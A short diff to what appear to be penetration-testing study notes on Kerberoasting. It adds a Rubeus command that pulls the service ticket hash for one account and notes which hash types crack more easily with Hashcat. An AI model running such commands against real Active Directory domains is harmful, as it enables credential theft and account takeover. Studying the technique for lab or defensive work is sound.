@@ -89,6 +89,11 @@ cat .\ilfreight_tgs.csv
 - High value targets
 - nowrap makes it easier to copy for Hashcat
 
+**Specific User
+```
+.\Rubeus.exe kerberoast /user:testspn /nowrap
+```
+
 If hash starts with $krb5tgs$23$*, it is RC4 (easier to crack)
 $krb5tgs$17$* = AES-128
 $krb5tgs$18$* = AES-256
